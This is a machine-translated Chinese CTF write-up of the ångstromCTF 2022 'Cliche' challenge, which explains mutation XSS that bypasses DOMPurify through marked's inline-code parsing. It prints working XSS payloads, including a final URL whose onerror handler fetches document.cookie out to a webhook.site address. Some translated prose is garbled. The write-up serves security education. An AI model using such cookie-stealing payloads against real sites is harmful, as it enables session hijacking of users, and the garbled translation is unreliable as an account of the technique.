<html>
<head>
<title>Cliche Writeup — ångstromCTF 2022</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">陈词滥调ngstromCTF 2022</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e?source=collection_archive---------1-----------------------#2022-05-05">https://infosecwriteups.com/clique-writeup-%C3%A5ngstromctf-2022-e7ae871eaa0e?source=collection_archive---------1-----------------------#2022-05-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><div class=""><h2 id="f2fa" class="pw-subtitle-paragraph jn ip iq bd b jo jp jq jr js jt ju jv jw jx jy jz ka kb kc kd ke dk translated">DOMPurify和marked中的突变XSS</h2></div><p id="e3cb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">上周末，我和我的团队浮士德一起玩了ngstromCTF 2022。在CTF期间，我遇到了一个相对简单但很聪明的网络挑战，我想和你们分享一下。这是陈词滥调。如果您只是来看解决方案的，请随意跳到最后一部分的结尾。</p><h1 id="f85a" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">挑战</h1><p id="e48d" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">挑战文本承诺了最没意思的网络挑战，对此我必须表示反对。除了挑战的链接之外，还提供了一个管理机器人，它的cookies中有一个标志，并跟随一个给定的链接。</p><blockquote class="ly lz ma"><p id="3418" class="kf kg mb kh b ki kj jr kk kl km ju kn mc kp kq kr md kt ku kv me kx ky kz la ij bi translated">疲惫和荒凉，蛤蜊放弃了写作创意网页。相反，他把过度使用的挑战想法的轮子转了三次，得到了“pastebin”、“markdown”和“input sanitization”。瞧吧，<a class="ae mf" href="https://cliche.web.actf.co/" rel="noopener ugc nofollow" target="_blank">世界上最无趣的网络挑战</a>。</p></blockquote><figure class="mh mi mj mk gt ml gh gi paragraph-image"><div role="button" tabindex="0" class="mm mn di mo bf mp"><div class="gh gi mg"><img src="../Images/86fc426b8e21512d85ef38c1c263c3e8.png" data-original-src="https://miro.medium.com/v2/resize:fit:778/format:webp/1*9IQbVxESBop2G88uoRx1QQ.png"/></div></div><figcaption class="ms mt gj gh gi mu mv bd b be z dk translated">挑战页面由一个文本区域和一个按钮组成。</figcaption></figure><p id="a164" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">当我们打开挑战时，我们只看到一个添加内容的文本区域和一个查看内容的按钮。点击按钮重新加载网页，将textarea内容作为URL参数:<code class="fe mw mx my mz b">https://clicke.web.actf.co/?content=&lt;u&gt;foobar&lt;/u&gt;</code>。然后，网页呈现内容。然而，任何明显的XSS都不会工作，所以我们接下来看一下源代码。</p><pre class="mh mi mj mk gt na mz nb nc aw nd bi"><span id="30f4" class="ne lc iq mz b gy nf ng l nh ni">&lt;script src="<a class="ae mf" href="https://cdn.jsdelivr.net/npm/dompurify@2.3.6/dist/purify.min.js" rel="noopener ugc nofollow" target="_blank">https://cdn.jsdelivr.net/npm/dompurify@2.3.6/dist/purify.min.js</a>"&gt;&lt;/script&gt;<br/>    &lt;script src="<a class="ae mf" href="https://cdn.jsdelivr.net/npm/marked@4.0.14/lib/marked.umd.min.js" rel="noopener ugc nofollow" target="_blank">https://cdn.jsdelivr.net/npm/marked@4.0.14/lib/marked.umd.min.js</a>"&gt;&lt;/script&gt;<br/>...<br/>&lt;script&gt;<br/> const qs = new URLSearchParams(location.search);<br/> if (qs.get(“content”)?.length &gt; 0) {<br/> document.body.innerHTML = marked.parse(DOMPurify.sanitize(qs.get(“content”)));<br/> }<br/> &lt;/script&gt;</span></pre><p id="135d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">代码揭示了为什么没有基本的XSS工作。因为挑战文本已经被破坏了，所以使用了HTML杀毒软件。在内容被添加到主体之前，页面首先用<a class="ae mf" href="https://github.com/cure53/DOMPurify" rel="noopener ugc nofollow" target="_blank"> DOMPurify </a>(版本2.3.6)净化它，然后用标记为的markdown库<a class="ae mf" href="https://github.com/markedjs/marked" rel="noopener ugc nofollow" target="_blank">(版本4.0.14)解析它。这两个模块都用于最新版本。</a></p><p id="2f6f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">由于我最近一直在研究奇怪的解析行为，很明显，挑战在于找到突变XSS有效载荷。</p><h1 id="1f4e" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">突变XSS</h1><p id="98ab" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">什么是突变XSS？mXSS的概念在Heider等人的论文中有很好的解释。这基本上意味着各种解析器多次改变XSS有效载荷，从以前的良性内容变成恶意内容。为了说明这一点，请看下面的例子:</p><pre class="mh mi mj mk gt na mz nb nc aw nd bi"><span id="eb04" class="ne lc iq mz b gy nf ng l nh ni">let init = '&lt;form id="first"&gt;&lt;div&gt;&lt;/form&gt;&lt;form id="second"&gt;';<br/>document.body.innerHTML = init;<br/>let mutated_1 = document.body.innerHTML;<br/>document.body.innerHTML = mutated;<br/>let mutated_2 = document.body.innerHTML;</span><span id="f5ba" class="ne lc iq mz b gy nj ng l nh ni">console.log(init);<br/>console.log(mutated_1);<br/>console.log(mutated_2);</span><span id="007f" class="ne lc iq mz b gy nj ng l nh ni">// Output<br/>&lt;form id="first"&gt;&lt;div&gt;&lt;/form&gt;&lt;form id="second"&gt;<br/>&lt;form id="first"&gt;&lt;div&gt;&lt;form id="second"&gt;&lt;/form&gt;&lt;/div&gt;&lt;/form&gt;<br/>&lt;form id="first"&gt;&lt;div&gt;&lt;/div&gt;&lt;/form&gt;</span></pre><p id="d1f6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们可以看到，通过将相同的字符串添加到innerHTML中，init HTML字符串通过多次解析发生了变化。这很奇怪，不是吗，因为我们希望HTML保持它的形式。然而，这是由<a class="ae mf" href="https://html.spec.whatwg.org/multipage/parsing.html#serialising-html-fragments:the-script-element-4:~:text=DOM.-,For%20example%2C%20consider%20the%20following%20markup%3A,%3Cform" rel="noopener ugc nofollow" target="_blank"> HTML规范</a>定义的行为。</p><p id="29a1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如今，HTML清理器或过滤器通常在浏览器呈现HTML输入之前先呈现它，以避免复杂的去模糊技术。然而，正如我们在上面看到的，HTML内容并不总是保持不变，并且会随着多个解析过程而变化。事实上，这种奇怪的HTML边缘案例导致了各种各样的绕过，例如，在DOMPurify <a class="ae mf" href="https://research.securitum.com/dompurify-bypass-using-mxss/" rel="noopener ugc nofollow" target="_blank">版本2.0.0 </a>或<a class="ae mf" href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/" rel="noopener ugc nofollow" target="_blank">版本2.0.17 </a>，甚至在<a class="ae mf" href="https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/" rel="noopener ugc nofollow" target="_blank">谷歌搜索</a>中的XSS。</p><h1 id="af45" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">解决办法</h1><p id="889f" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">记住上一节，我们可以看到这个挑战有三个连续的解析器。首先，输入由DOMPurify解析，然后由marked解析，最后由浏览器通过innerHTML解析。这像mXSS一样臭。</p><p id="3f94" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">在尝试了各种典型的mXSS技术(如表格、表单或样式元素)失败之后，我把注意力集中在了降价部分。我尝试了多种结合HTML内容的markdown元素，这些元素可能会触发XSS。由于DOMPurify过滤了HTML中的所有恶意部分，我很清楚我必须找到一个破坏HTML的markdown元素，这样我就可以从隐藏在良性HTML部分中的内容中伪造一个恶意的有效载荷，例如，一个属性。这时我发现了markdown代码块(`)。</p><pre class="mh mi mj mk gt na mz nb nc aw nd bi"><span id="3bdb" class="ne lc iq mz b gy nf ng l nh ni">var inp ='`&lt;p id="aaa`bbb"&gt;';<br/>document.body.innerHTML = marked.parse(DOMPurify.sanitize(inp));<br/>// Ouput<br/>'&lt;p&gt;&lt;code&gt;&amp;lt;p id=&amp;quot;aaa&lt;/code&gt;bbb&amp;quot;&amp;gt;&lt;/p&gt;&lt;/p&gt;\n'</span></pre><p id="dba5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如上所述，markdown内联代码的优先级高于HTML元素，并且会破坏它。前半部分在代码块中结束；后半部分在外面。正是我需要的！</p><pre class="mh mi mj mk gt na mz nb nc aw nd bi"><span id="9a20" class="ne lc iq mz b gy nf ng l nh ni">// Payload<br/>`&lt;p x="`&lt;img src=x onerror=alert(1)&gt;"&gt;&lt;/p&gt;</span><span id="2c6a" class="ne lc iq mz b gy nj ng l nh ni">// Output<br/>&lt;p&gt;&lt;code&gt;&amp;lt;p id=&amp;quot;&lt;/code&gt;&lt;img src=x onerror=alert(1)&gt;&amp;quot;&amp;gt;&lt;/p&gt;&lt;/p&gt;</span></pre><p id="f10e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">有效载荷对于DOMPurify来说看起来不错，因为id中的恶意部分不会造成损害。但是，然后，标记打破了属性，并把它的代码元素放在它周围。因此，图像元素在属性之外，并被解析为标准元素，从而触发警报。</p><p id="66b4" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我发送给机器人的最终有效载荷如下所示，并给了我一个标志:</p><pre class="mh mi mj mk gt na mz nb nc aw nd bi"><span id="031f" class="ne lc iq mz b gy nf ng l nh ni"><a class="ae mf" href="https://cliche.web.actf.co/?content=`%3Cp%20x=%22`%3Cimg%20src=x%20onerror=fetch(window.location.hash.substring(1)%2Bdocument.cookie)%3E%22%3E%3C/p%3E#https://webhook.site/1b96a1e3-307b-4f46-9f3a-e3eba4cc538d?x=" rel="noopener ugc nofollow" target="_blank">https://cliche.web.actf.co/?content=`%3Cp%20x=%22%3Cimg%20src=x%20onerror=fetch(window.location.hash.substring(1)%2Bdocument.cookie)%3Efoo%3C/img%3E%22%20title=%22hello`%22%3E%3Cimg%20src=x%3E%3C/p%3E#https://webhook.site/1b96a1e3-307b-4f46-9f3a-e3eba4cc538d?x=</a></span><span id="09ec" class="ne lc iq mz b gy nj ng l nh ni">// Output on webhook.site:<br/>actf{my_code_is_upside_down_topsy_turvy_1029318}</span></pre><h1 id="cb41" class="lb lc iq bd ld le lf lg lh li lj lk ll jw lm jx ln jz lo ka lp kc lq kd lr ls bi translated">结论</h1><p id="fc6d" class="pw-post-body-paragraph kf kg iq kh b ki lt jr kk kl lu ju kn ko lv kq kr ks lw ku kv kw lx ky kz la ij bi translated">这一激动人心的挑战再次表明，即使最初的意图是好的，在代码中加入bug也是多么容易。有趣的是<a class="ae mf" href="https://marked.js.org/#usage" rel="noopener ugc nofollow" target="_blank"> marked甚至推荐</a> DOMPurify作为消毒剂。然而，正如我们所看到的，这只有在卫生是这个过程的最后一步的情况下才有效。</p><p id="a8a8" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">除了我的解决方案，我相信一定有更有趣的方法来解决这个挑战。我很想知道还有什么其他可行的解决方案。</p><p id="82df" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><a class="ae mf" href="https://twitter.com/fh4ntke" rel="noopener ugc nofollow" target="_blank">https://twitter.com/fh4ntke</a></p></div></div>    
</body>
</html>